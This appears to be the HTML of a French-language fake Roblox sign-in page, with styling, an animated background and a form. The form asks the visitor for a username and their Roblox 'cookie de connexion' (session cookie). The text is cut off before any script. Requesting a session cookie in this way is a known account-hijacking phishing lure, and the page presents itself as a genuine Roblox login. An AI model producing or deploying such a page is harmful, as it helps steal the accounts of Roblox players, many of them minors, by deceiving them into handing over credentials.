<!DOCTYPE html>
<html>
<head>
  <title>Connecte-toi à ton compte Roblox pour commencer</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      color: #ffffff;
    }
    
    .container {
      position: relative;
      max-width: 400px;
      margin: 300px auto 0;
      padding: 20px;
      background-color: rgba(0, 0, 0, 0.5);
      border-radius: 5px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
      animation: fadeIn 1s ease-in-out;
    }
    
    @keyframes fadeIn {
      0% {
        opacity: 0;
        transform: translateY(-20px);
      }
      100% {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    h2 {
      text-align: center;
      color: #ffffff;
    }
    
    .form-group {
      margin-bottom: 15px;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    
    .form-group input {
      width: 60%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 3px;
      font-size: 16px;
      background-color: #660099;
      color: #ffffff;
    }
    
    .form-group button {
      width: 100%;
      padding: 10px;
      border: none;
      background-color: #4CAF50;
      color: #ffffff;
      font-size: 16px;
      cursor: pointer;
      border-radius: 3px;
    }
    
    .form-group button:hover {
      background-color: #45a049;
    }
    
    .form-group .error-message {
      color: #ff0000;
      font-size: 14px;
      margin-top: 5px;
    }
    
    .background-image {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: url('https://i.imgur.com/0ngf0ai.jpg');
      background-size: cover;
      z-index: -1;
      animation: animateBackground 10s linear infinite;
    }
    
    @keyframes animateBackground {
      0% {
        filter: brightness(50%);
      }
      50% {
        filter: brightness(200%);
        transform: scale(1.1);
      }
      100% {
        filter: brightness(50%);
      }
    }
  </style>
</head>
<body>
  <div class="background-image"></div>
  <div class="container">
    <h2>Connecte-toi à ton compte Roblox pour commencer</h2>
    <form id="login-form">
      <div class="form-group">
        <label for="username">Pseudo :</label>
        <input type="text" id="username" required>
      </div>
      <div class="form-group">
        <label for="cookie">Cookie de connexion :</label>
        <input type="text" id="cookie" required>
      </div>
      <div class="form-group">
        <button type="submit">Login</button>
      </div>
    </form>
  </
